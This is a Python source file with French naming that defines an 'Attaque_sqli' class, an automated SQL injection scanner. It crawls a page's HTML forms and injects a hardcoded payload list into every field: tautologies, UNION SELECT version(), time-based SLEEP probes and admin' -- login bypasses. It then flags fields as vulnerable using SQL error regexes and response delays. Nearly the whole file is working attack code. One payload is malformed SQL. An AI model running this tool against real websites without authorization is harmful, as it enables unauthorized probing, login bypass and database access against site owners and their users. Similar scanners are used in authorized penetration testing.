import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import time
import random
import re

class Attaque_sqli:
    def __init__(self):
        self.resultats = []
        self.session = requests.Session()
        
        # Payloads SQLi ciblés
        self.payloads = [
            "' OR '1'='1", 
            "' OR '1'='1'--", 
            "' UNION SELECT null, version()--", 
            "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--", 
            "' OR IF(1=1, SLEEP(2), 0)--",
            "' OR 1=1 --",
            "1' OR '1' = '1",
            "admin' --",
            "admin' #",
            "admin'/*",
            "'UNION user = 'admin' --"
            
        ]
        
        # Patterns d'erreurs SQL
        self.sql_error_patterns = [
            r"SQL syntax.*?MySQL", 
            r"Warning.*?mysql_", 
            r"MySQLSyntaxErrorException", 
            r"valid MySQL result",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"PostgreSQL.*?ERROR",
            r"sqlite",
            r"syntax error"
        ]
        
        self.blind_sql_patterns = [
            "SLEEP", "BENCHMARK", "WAITFOR DELAY"
        ]

    def trouver_formulaires(self, url):
        print(f"[INFO] Analyse de {url}")
        try:
            response = self.session.get(url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            print(f"[INFO] {len(forms)} formulaire(s) trouvé(s) sur {url}")
            return forms
        except Exception as e:
            print(f"[ERREUR] Impossible d'accéder à {url}: {str(e)}")
            return []

    def extraire_details_formulaire(self, form, base_url):
        action = form.get("action", "")
        action_url = urljoin(base_url, action) if action else base_url
        method = form.get("method", "get").lower()
        
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.get("type", "text")
            input_name = input_tag.get("name")
            if input_name:
                inputs.append({"name": input_name, "type": input_type})
        
        print(f"[INFO] Formulaire détecté: action={action_url}, méthode={method}, champs={inputs}")
        return {"action": action_url, "method": method, "inputs": inputs}
    
    def test_sqli(self, url, form_details):
        action_url = form_details["action"]
        method = form_details["method"]
        inputs = form_details["inputs"]

        for input_field in inputs:
            input_name = input_field["name"]
            random.shuffle(self.payloads)
            for payload in self.payloads:
                data = {nom_input["name"]: "" for nom_input in inputs}  
                data[input_name] = payload  
                
                try:
                    start_time = time.time()
                    if method == "post":
                        response = self.session.post(action_url, data=data, timeout=10)
                    else:
                        response = self.session.get(action_url, params=data, timeout=10)
                    temps_reponse = time.time() - start_time
                    
                    faille = False
                    type_vuln = ""
                    
                    for pattern in self.sql_error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            faille = True
                            type_vuln = "Error-based SQLi"
                            break
                    
                    if not faille:
                        for pattern in self.blind_sql_patterns:
                            if pattern in payload and temps_reponse > 3:
                                faille = True
                                type_vuln = "Blind SQLi (time-based)"
                                break
                    
                    if faille:
                        print(f"[VULNÉRABLE] {url} - Champ {input_name} vulnérable ({type_vuln}) avec {payload}")
                        self.resultats.append({
                            "url": url,
                            "form_action": action_url,
                            "champ": input_name,
                            "payload": payload,
                            "type_vuln": type_vuln,
                            "temps_reponse": round(temps_reponse, 3)
                        })
                except Exception as e:
                    print(f"[ERREUR] Test échoué sur {url} avec {payload}: {str(e)}")
    
    def scanner(self, url):
        formulaires = self.trouver_formulaires(url)
        for form in formulaires:
            details = self.extraire_details_formulaire(form, url)
            if details["inputs"]:
                self.test_sqli(url, details)
    
    def run_sqli(self, url):
        self.scanner(url)
        return self.resultats

